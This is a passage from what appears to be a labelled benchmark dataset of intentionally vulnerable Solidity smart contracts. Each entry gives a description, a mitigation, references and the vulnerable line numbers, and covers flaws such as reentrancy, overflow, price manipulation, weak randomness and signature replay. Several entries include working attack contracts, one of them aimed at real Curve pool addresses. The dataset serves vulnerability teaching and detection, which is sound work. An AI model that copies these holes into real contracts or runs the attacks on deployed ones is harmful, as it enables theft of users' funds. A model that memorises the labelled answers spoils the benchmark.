3. Properly validate balances before transfers
This vulnerability demonstrates why proper integer overflow/underflow protection is crucial 
in smart contract development, particularly in token contracts where numerical operations 
are frequent and critical to the contract's security.
*/
/*
 * @vulnerable_at_lines: 66
 */
contract TokenWhaleChallenge {
    address player;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = ""Simple ERC20 Token"";
    string public symbol = ""SET"";
    uint8 public decimals = 18;
    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }
    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
    }
    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        _transfer(to, value);
    }
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }
    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);
        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}",[52]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Incorrect use of payable.transfer()
Description:
After the implementation of EIP 1884 in the Istanbul hard fork, 
the gas cost of the SLOAD operation was increased, 
resulting in the breaking of some existing smart contracts.
When transferring ETH to recipients, if Solidity's transfer() or send() method 
is used, certain shortcomings arise, particularly when the recipient 
is a smart contract. These shortcomings can make it impossible to 
successfully transfer ETH to the smart contract recipient.
Specifically, the transfer will inevitably fail when the smart contract:
    1.does not implement a payable fallback function, or
    2.implements a payable fallback function which would incur more than 2300 gas units, or
    3.implements a payable fallback function incurring less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300.
Mitigation:  
Using call with its returned boolean checked in combination with re-entrancy guard is highly recommended.
REF:
https://twitter.com/1nf0s3cpt/status/1678958093273829376
https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/
https://github.com/code-423n4/2022-12-escher-findings/issues/99
*/
/*
 * @vulnerable_at_lines: 50
 */
contract SimpleBank {
    mapping(address => uint) private balances;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }
    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        // the issue is here
        payable(msg.sender).transfer(amount);
    }
}
contract FixedSimpleBank {
    mapping(address => uint) private balances;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }
    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        (bool success, ) = payable(msg.sender).call{value: amount}("""");
        require(success, "" Transfer of ETH Failed"");
    }
}",[39]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";
/*
Name: Phantom function - Permit Function 
Description:
Phantom function: Accepts any call to a function that it doesn't actually define, without reverting.
key:
1.Token that does not support EIP-2612 permit. 
2.Token has a fallback function.
For example: WETH.
Mitigation:  
Use SafeERC20's safePermit - Revert on invalid signature.
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24
REF:
https://twitter.com/1nf0s3cpt/status/1671347058568237057
https://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f
*/
/*
 * @vulnerable_at_lines: 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60
 */
contract VulnPermit {
    IERC20 public token;
    constructor(IERC20 _token) {
        token = _token;
    }
    function deposit(uint256 amount) public {
        require(
            token.transferFrom(msg.sender, address(this), amount),
            ""Transfer failed""
        );
    }
    function depositWithPermit(
        address target,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool success, ) = address(token).call(
            abi.encodeWithSignature(
                ""permit(address,uint256,uint8,bytes32,bytes32)"",
                target,
                amount,
                v,
                r,
                s
            )
        );
        require(success, ""Permit failed"");
        require(
            token.transferFrom(target, address(this), amount),
            ""Transfer failed""
        );
    }
    function withdraw(uint256 amount) public {
        require(token.transfer(msg.sender, amount), ""Transfer failed"");
    }
}
contract WETH9 {
    string public name = ""Wrapped Ether"";
    string public symbol = ""WETH"";
    uint8 public decimals = 18;
    event Approval(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);
    event Deposit(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    fallback() external payable {
        deposit();
    }
    receive() external payable {}
    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        payable(msg.sender).transfer(wad);
        emit Withdrawal(msg.sender, wad);
    }
    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }
    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }
    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }
    function transferFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(balanceOf[src] >= wad);
        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }
        balanceOf[src] -= wad;
        balanceOf[dst] += wad;
        emit Transfer(src, dst, wad);
        return true;
    }
}","[40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Precision Loss - rounding down to zero
Description:
Support all the ERC20 tokens, as those tokens may have different decimal places. 
For example, USDT and USDC have 6 decimals. So, in the calculations, one must be careful.
Mitigation:  
Avoid any situation that if the numerator is smaller than the denominator, the result will be zero.
Rounding down related issues can be avoided in many ways:
    1.Using libraries for rounding up/down as expected
    2.Requiring result is not zero or denominator is <= numerator
    3.Refactor operations for avoiding first dividing then multiplying, when first dividing then multiplying, precision lost is amplified
REF:
https://twitter.com/1nf0s3cpt/status/1675805135061286914
https://github.com/sherlock-audit/2023-02-surge-judging/issues/244
https://github.com/sherlock-audit/2023-02-surge-judging/issues/122
https://dacian.me/precision-loss-errors#heading-rounding-down-to-zero
*/
/*
 * @vulnerable_at_lines: 52
 */
contract SimplePool {
    uint public totalDebt;
    uint public lastAccrueInterestTime;
    uint public loanTokenBalance;
    constructor() {
        totalDebt = 10000e6; //debt token is USDC and has 6 digit decimals.
        lastAccrueInterestTime = block.timestamp - 1;
        loanTokenBalance = 500e18;
    }
    function getCurrentReward() public view returns (uint _reward) {
        // Get the time passed since the last interest accrual
        uint _timeDelta = block.timestamp - lastAccrueInterestTime; //_timeDelta=1
        // If the time passed is 0, return 0 reward
        if (_timeDelta == 0) return 0;
        // Calculate the supplied value
        // uint _supplied = totalDebt + loanTokenBalance;
        //console.log(_supplied);
        // Calculate the reward
        _reward = (totalDebt * _timeDelta) / (365 days * 1e18);
        // 31536000 is the number of seconds in a year
        // 365 days * 1e18 = 31_536_000_000_000_000_000_000_000
        //_totalDebt * _timeDelta / 31_536_000_000_000_000_000_000_000
        // 10_000_000_000 * 1 / 31_536_000_000_000_000_000_000_000 // -> 0
        _reward;
    }
}",[41]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
import ""@openzeppelin/contracts/access/Ownable.sol"";
/*
Name: Price manipulation
Description:
Incorrect price calculation over balanceOf, getReverse may refer to a situation 
where the price of a token or asset is not accurately calculated based on the balanceOf function.
Mitigation:  
Use a manipulation resistant oracle, chainlink, TWAP, etc.
REF:
https://twitter.com/1nf0s3cpt/status/1673948842738487296
https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20221012-atk---flashloan-manipulate-price
https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220807-egd-finance---flashloans--price-manipulation
https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220428-deus-dao---flashloan--price-oracle-manipulation
*/
/*
 * @vulnerable_at_lines: 68
 */
contract USDa is ERC20, Ownable {
    constructor() ERC20(""USDA"", ""USDA"") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }
    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}
contract USDb is ERC20, Ownable {
    constructor() ERC20(""USDB"", ""USDB"") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }
    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}
contract SimplePool {
    IERC20 public USDaToken;
    IERC20 public USDbToken;
    constructor(address _USDa, address _USDb) {
        USDaToken = IERC20(_USDa);
        USDbToken = IERC20(_USDb);
    }
    function getPrice() public view returns (uint256) {
        //Incorrect price calculation over balanceOf
        uint256 USDaAmount = USDaToken.balanceOf(address(this));
        uint256 USDbAmount = USDbToken.balanceOf(address(this));
        // Ensure USDbAmount is not zero to prevent division by zero
        if (USDaAmount == 0) {
            return 0;
        }
        // Calculate the price as the ratio of USDa to USDb
        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }
    function flashLoan(
        uint256 amount,
        address borrower,
        bytes calldata data
    ) public {
        uint256 balanceBefore = USDaToken.balanceOf(address(this));
        require(balanceBefore >= amount, ""Not enough liquidity"");
        require(
            USDaToken.transfer(borrower, amount),
            ""Flashloan transfer failed""
        );
        (bool success, ) = borrower.call(data);
        require(success, ""Flashloan callback failed"");
        uint256 balanceAfter = USDaToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, ""Flashloan not repaid"");
    }
}
contract SimpleBank {
    IERC20 public token; //USDA
    SimplePool public pool;
    IERC20 public payoutToken; //USDb
    constructor(address _token, address _pool, address _payoutToken) {
        token = IERC20(_token);
        pool = SimplePool(_pool);
        payoutToken = IERC20(_payoutToken);
    }
    function exchange(uint256 amount) public {
        require(
            token.transferFrom(msg.sender, address(this), amount),
            ""Transfer failed""
        );
        uint256 price = pool.getPrice();
        require(price > 0, ""Price cannot be zero"");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutToken.transfer(msg.sender, tokensToReceive),
            ""Payout transfer failed""
        );
    }
}",[53]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Private Data Exposure
Description:
Solidity stores the variables defined in the contract in slots. Each slot can accommodate up to 32 bytes or 256 bits. Given that all data stored on-chain, whether public or private, can be read, it is possible to read private data from the Vault contract by predicting the memory slot where the private data resides.
If the Vault contract is utilized in a production environment, malicious actors could employ similar techniques to access sensitive information such as user passwords.
Mitigation:
Avoid storing sensitive data on-chain
REF
https://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d
*/
/*
 * @vulnerable_at_lines: 25, 28
 */
contract Vault {
    // slot 0
    uint256 private password;
    constructor(uint256 _password) {
        password = _password;
        User memory user = User({id: 0, password: bytes32(_password)});
        users.push(user);
        idToUser[0] = user;
    }
    struct User {
        uint id;
        bytes32 password;
    }
    // slot 1
    User[] public users;
    // slot 2
    mapping(uint => User) public idToUser;
    function getArrayLocation(
        uint slot,
        uint index,
        uint elementSize
    ) public pure returns (bytes32) {
        uint256 a = uint(keccak256(abi.encodePacked(slot))) +
            (index * elementSize);
        return bytes32(a);
    }
}","[18, 20]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Predictable Randomness Vulnerability
Description:
Use of global variables like block hash, block number, 
block timestamp and other fields is insecure, miner and attacker can control it.
Scenario:
GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
pseudo random number generated from block hash and timestamp.
At first glance, it seems impossible to guess the correct number.
But let's see how easy it is win.
1. Alice deploys GuessTheRandomNumber with 1 Ether
2. Eve deploys Attack
3. Eve calls Attack.attack() and wins 1 Ether
What happened?
Attack computed the correct answer by simply copying the code that computes the random number.
Mitigation:
Don't use blockhash and block.timestamp as source of randomness
REF:
https://solidity-by-example.org/hacks/randomness/
*/
/*
 * @vulnerable_at_lines: 41, 42, 43, 44, 45
 */
contract GuessTheRandomNumber {
    constructor() payable {}
    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("""");
            require(sent, ""Failed to send Ether"");
        }
    }
}
contract Attack {
    receive() external payable {}
    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        guessTheRandomNumber.guess(answer);
    }
    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}","[29, 30, 31, 32, 33]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""./interface.sol"";
/*
Name: Read-Only Reentrancy Vulnerability
Description:
The Read-Only Reentrancy Vulnerability is a flaw in smart contract design that allows attackers 
to exploit the ""read-only"" nature of a function to make unintended changes to the contract's state. 
Specifically, the vulnerability arises when an attacker uses the remove_liquidity function of the ICurve contract 
to trigger the receive function in the ExploitContract. This is achieved by an external call 
from a secure smart contract ""A"" invoking the fallback() function in the attacker's contract.
Through this exploit, the attacker gains the ability to execute code within the fallback() function
against a target contract ""B,"" which is indirectly related to contract ""A."" Contract ""B"" derives
the price of the LP token from Contract ""A,"" making it susceptible to manipulation and unintended price changes
through the reentrancy attack.
Mitigation:
Avoid any state-changing operations within functions that are intended to be read-only.
Makerdao example:
        // This will revert if called during execution of a state-modifying pool function.
        if (nonreentrant) {
            uint256[2] calldata amounts;
            CurvePoolLike(pool).remove_liquidity(0, amounts);
        }
REF
https://twitter.com/1nf0s3cpt/status/1590622114834706432
https://chainsecurity.com/heartbreaks-curve-lp-oracles/
https://medium.com/@zokyo.io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334
https://www.youtube.com/watch?v=0fgGTRlsDxI
*/
/*
 * @vulnerable_at_lines: 85, 86
 */
interface ICurve {
    function get_virtual_price() external view returns (uint);
    function add_liquidity(
        uint[2] calldata amounts,
        uint min_mint_amount
    ) external payable returns (uint);
    function remove_liquidity(
        uint lp,
        uint[2] calldata min_amounts
    ) external returns (uint[2] memory);
    function remove_liquidity_one_coin(
        uint lp,
        int128 i,
        uint min_amount
    ) external returns (uint);
}
address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token
// VulnContract
// users stake LP_TOKEN
// getReward rewards the users based on the current price of the pool LP token
contract VulnContract {
    IERC20 public constant token = IERC20(LP_TOKEN);
    ICurve private constant pool = ICurve(STETH_POOL);
    mapping(address => uint) public balanceOf;
    function stake(uint amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender] += amount;
    }
    function unstake(uint amount) external {
        balanceOf[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }
    function getReward() external view returns (uint) {
        //rewarding tokens based on the current virtual price of the pool LP token
        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
            1 ether;
        // Omitting code to transfer reward tokens
        return reward;
    }
}
contract ExploitContract {
    ICurve private constant pool = ICurve(STETH_POOL);
    IERC20 public constant lpToken = IERC20(LP_TOKEN);
    VulnContract private immutable target;
    constructor(address _target) {
        target = VulnContract(_target);
    }
    // Stake LP into VulnContract
    function stakeTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        lpToken.approve(address(target), lp);
        target.stake(lp);
    }
    // Perform Read-Only Reentrancy
    function performReadOnlyReentrnacy() external payable {
        // Add liquidity to Curve
        uint[2] memory amounts = [msg.value, 0];
        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        // Remove liquidity from Curve
        // remove_liquidity() invokes the recieve() callback
        uint[2] memory min_amounts = [uint(0), uint(0)];
        pool.remove_liquidity(lp, min_amounts);
        // Attack - Log reward amount
        uint reward = target.getReward();
    }
    receive() external payable {
        // receive() is called when the remove_liquidity is called
        // Attack - Log reward amount
        uint reward = target.getReward();
    }
}","[68, 69]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
import ""@openzeppelin/contracts/access/Ownable.sol"";
import ""@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol"";
/*
Name: Incorrect implementation of the recoverERC20() function in the StakingRewards
Description:
The recoverERC20() function in StakingRewards.sol can potentially serve as a backdoor for the owner to retrieve rewardsToken.
There is no corresponding check against the rewardsToken. This creates an administrative privilege where the owner can sweep the rewards tokens, potentially using it as a means to exploit depositors.
It's similar to a forked issue if you forked vulnerable code.
Mitigation:  
disallowing recovery of the rewardToken within the recoverErc20 function
REF:
https://twitter.com/1nf0s3cpt/status/1680806251482189824
https://github.com/code-423n4/2022-02-concur-findings/issues/210
https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49
https://github.com/code-423n4/2022-10-paladin-findings/issues/40
https://blog.openzeppelin.com/across-token-and-token-distributor-audit#anyone-can-prevent-stakers-from-getting-their-rewards
*/
/*
 * @vulnerable_at_lines: 53, 49
 */
contract VulnStakingRewards {
    using SafeERC20 for IERC20;
    IERC20 public rewardsToken;
    address public owner;
    event Recovered(address token, uint256 amount);
    constructor(address _rewardsToken) {
        rewardsToken = IERC20(_rewardsToken);
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, ""Only owner can call this function"");
        _;
    }
    function recoverERC20(
        address tokenAddress,
        uint256 tokenAmount
    ) public onlyOwner {
        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);
        emit Recovered(tokenAddress, tokenAmount);
    }
}
contract FixedtakingRewards {
    using SafeERC20 for IERC20;
    IERC20 public rewardsToken;
    address public owner;
    event Recovered(address token, uint256 amount);
    constructor(address _rewardsToken) {
        rewardsToken = IERC20(_rewardsToken);
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, ""Only owner can call this function"");
        _;
    }
    function recoverERC20(
        address tokenAddress,
        uint256 tokenAmount
    ) external onlyOwner {
        require(
            tokenAddress != address(rewardsToken),
            ""Cannot withdraw the rewardsToken""
        );
        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);
        emit Recovered(tokenAddress, tokenAmount);
    }
}
contract RewardToken is ERC20, Ownable {
    constructor() ERC20(""Rewardoken"", ""Reward"") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }
}","[37, 41]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Reentrancy Vulnerability
Description:
The EtherStore Reentrancy Vulnerability is a flaw in the smart contract design that allows 
an attacker to exploit reentrancy and withdraw more funds than they are entitled to from the EtherStore contract. 
The vulnerability arises due to the withdrawFunds function in the EtherStore contract,
where the Ether is transferred to the attacker's address before updating their balance. 
This allows the attacker's contract to make a reentrant call back to the withdrawFunds function before the balance update, 
leading to multiple withdrawals and potentially draining all the Ether from the EtherStore contract.
Scenario:
EtherStore is a simple vault, it can manage everyone's ethers.
But it's vulnerable, can you steal all the ethers ?
Mitigation:
Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.
REF
https://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a
https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/
*/
/*
 * @vulnerable_at_lines: 41, 46, 45, 47
 */
contract EtherStore {
    mapping(address => uint256) public balances;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("""");
        require(send, ""send failed"");
        // check if after send still enough to avoid underflow
        if (balances[msg.sender] >= _weiToWithdraw) {
            balances[msg.sender] -= _weiToWithdraw;
        }
    }
}
contract EtherStoreRemediated {
    mapping(address => uint256) public balances;
    bool internal locked;
    modifier nonReentrant() {
        require(!locked, ""No re-entrancy"");
        locked = true;
        _;
        locked = false;
    }
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {
        require(balances[msg.sender] >= _weiToWithdraw);
        balances[msg.sender] -= _weiToWithdraw;
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("""");
        require(send, ""send failed"");
    }
}
contract EtherStoreAttack {
    EtherStore store;
    constructor(address _store) {
        store = EtherStore(_store);
    }
    function Attack() public {
        store.deposit{value: 1 ether}();
        store.withdrawFunds(1 ether); // exploit here
    }
    // fallback() external payable {}
    // we want to use fallback function to exploit reentrancy
    receive() external payable {
        if (address(store).balance >= 1 ether) {
            store.withdrawFunds(1 ether); // exploit here
        }
    }
}","[31, 34, 35, 36]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Use of return in inner loop iteration leads to unintended termination. 
Description:
BankContractBug's addBanks function exhibits an incorrect usage of the return statement within a loop iteration, 
resulting in unintended termination of the loop. The return statement is placed inside the inner loop, 
causing premature exit from the function before completing the iteration over all bank addresses. 
Mitigation:  
Use break instead of return
REF:
https://twitter.com/1nf0s3cpt/status/1678596730865221632
https://github.com/code-423n4/2022-03-lifinance-findings/issues/34
https://solidity-by-example.org/loop/
*/
/*
 * @vulnerable_at_lines: 51
 */
contract BankContractBug {
    struct Bank {
        address bankAddress;
        string bankName;
    }
    Bank[] public banks;
    function addBanks(
        address[] memory bankAddresses,
        string[] memory bankNames
    ) public {
        require(
            bankAddresses.length == bankNames.length,
            ""Input arrays must have the same length.""
        );
        for (uint i = 0; i < bankAddresses.length; i++) {
            if (bankAddresses[i] == address(0)) {
                continue;
            }
            // i++ is not executed when return is executed
            for (i = 0; i < bankAddresses.length; i++) {
                banks.push(Bank(bankAddresses[i], bankNames[i]));
                return;
            }
        }
    }
    function getBankCount() public view returns (uint) {
        return banks.length;
    }
}
contract FixedBank {
    struct Bank {
        address bankAddress;
        string bankName;
    }
    Bank[] public banks;
    function addBanks(
        address[] memory bankAddresses,
        string[] memory bankNames
    ) public {
        require(
            bankAddresses.length == bankNames.length,
            ""Input arrays must have the same length.""
        );
        for (uint i = 0; i < bankAddresses.length; i++) {
            if (bankAddresses[i] == address(0)) {
                continue;
            }
            for (uint i = 0; i < bankAddresses.length; i++) {
                banks.push(Bank(bankAddresses[i], bankNames[i]));
                break; // Correct usage of break to terminate the inner loop
            }
        }
    }
    function getBankCount() public view returns (uint) {
        return banks.length;
    }
}",[40]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Missing Check for Self-Transfer Allows Funds to be Lost
Description:
The vulnerability in the code stems from the absence of a check to prevent self-transfers. 
This oversight allows the transfer function to erroneously transfer funds to the same address. 
Consequently, funds are lost as the code fails to deduct the transferred amount from the sender's balance.
This vulnerability undermines the correctness of fund transfers within the contract and poses a risk 
to the integrity of user balances.
Mitigation:  
Add condition to prevent transfer between same addresses
REF:
https://twitter.com/1nf0s3cpt/status/1679373800327241728
https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299
https://www.immunebytes.com/blog/bzxs-security-focused-relaunch-followed-by-a-hack-how/
*/
/*
 * @vulnerable_at_lines: 41, 40, 39, 42
 */
contract SimpleBank {
    mapping(address => uint256) private _balances;
    function balanceOf(address _account) public view virtual returns (uint256) {
        return _balances[_account];
    }
    function transfer(address _from, address _to, uint256 _amount) public {
        // not check self-transfer
        uint256 _fromBalance = _balances[_from];
        uint256 _toBalance = _balances[_to];
        unchecked {
            _balances[_from] = _fromBalance - _amount;
            _balances[_to] = _toBalance + _amount;
        }
    }
}
contract FixedSimpleBank {
    mapping(address => uint256) private _balances;
    function balanceOf(address _account) public view virtual returns (uint256) {
        return _balances[_account];
    }
    function transfer(address _from, address _to, uint256 _amount) public {
        //Mitigation
        require(_from != _to, ""Cannot transfer funds to the same address."");
        uint256 _fromBalance = _balances[_from];
        uint256 _toBalance = _balances[_to];
        unchecked {
            _balances[_from] = _fromBalance - _amount;
            _balances[_to] = _toBalance + _amount;
            /*
            Another mitigation
            _balances[_id][_from] -= _amount;
            _balances[_id][_to] += _amount;
            */
        }
    }
}","[30, 31, 32, 33]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Self-Destruct Vulnerability
Description:
The EtherGame Self-Destruct Vulnerability is a flaw in the smart contract code that allows an attacker 
to disrupt the game by causing the EtherGame contract to self-destruct (using the selfdestruct opcode). 
The vulnerability arises due to the dos function in the Attack contract, which performs a self-destruct
operation on the EtherGame contract after receiving a significant amount of Ether. As a result of the self-destruct, 
the EtherGame contract's functionality is permanently disabled, making it impossible for anyone to deposit or claim the winner's reward.
Scenario:
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game No one can become the winner.
What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
Due to missing or insufficient access controls, malicious parties can self-destruct the contract.
The selfdestruct(address) function removes all bytecode from the contract address and sends all ether stored to the specified address.
Mitigation:
Instead of relying on this.balance to track the deposited Ether, 
use a state variable to keep track of the total deposited amount.
*/
/*
 * @vulnerable_at_lines: 41
 */
contract EtherGame {
    uint public constant targetAmount = 7 ether;
    address public winner;
    function deposit() public payable {
        require(msg.value == 1 ether, ""You can only send 1 Ether"");
        uint balance = address(this).balance; // vulnerable
        require(balance <= targetAmount, ""Game is over"");
        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }
    function claimReward() public {
        require(msg.sender == winner, ""Not winner"");
        (bool sent, ) = msg.sender.call{value: address(this).balance}("""");
        require(sent, ""Failed to send Ether"");
    }
}
contract Attack {
    EtherGame etherGame;
    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }
    function dos() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether
        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}",[33]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
This excersise is about selfdestructing (deprecated) and force sending ether to a contract
Force implements neither receive nor fallaback functions. Calls with any value will revert.
*/
/*
 * @vulnerable_at_lines: 13
 */
contract Force {
    /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)
*/
}
contract Attack {
    function attack(address force) public payable {
        selfdestruct(payable(force));
    }
}",[10]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Signature Replay Vulnerability
Description:
In this scenario, Alice signs a transaction that allows Bob to transfer tokens from Alice's account 
to Bob's account. Bob then replays this signature on multiple contracts 
(in this case, the TokenWhale and SixEyeToken contracts), each time authorizing the transfer of tokens 
from Alice's account to his. This is possible because the contracts use the same methodology for signing
and validating transactions, but they do not share a nonce to prevent replay attacks.
Missing protection against signature replay attacks, Same signature can be used multiple times to execute a function.
Mitigation:
Replay attacks can be prevented by implementing a nonce, a number that is only used once, into the signing and verification process. 
REF:
https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57
https://medium.com/cypher-core/replay-attack-vulnerability-in-ethereum-smart-contracts-introduced-by-transferproxy-124bf3694e25
*/
/*
 * @vulnerable_at_lines: 118
 */
contract TokenWhale {
    address player;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = ""Simple ERC20 Token"";
    string public symbol = ""SET"";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;
    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 2000;
        balanceOf[player] = 2000;
    }
    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
    }
    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        _transfer(to, value);
    }
    function transferProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();
        if (
            balanceOf[_to] + _value < balanceOf[_to] ||
            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]
        ) revert();
        balanceOf[_to] += _value;
        balanceOf[msg.sender] += _feeUgt;
        balanceOf[_from] -= _value + _feeUgt;
        nonces[_from] = nonce + 1;
        return true;
    }
}
contract SixEyeToken {
    address player;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = ""Six Eye Token"";
    string public symbol = ""SIX"";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;
    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 2000;
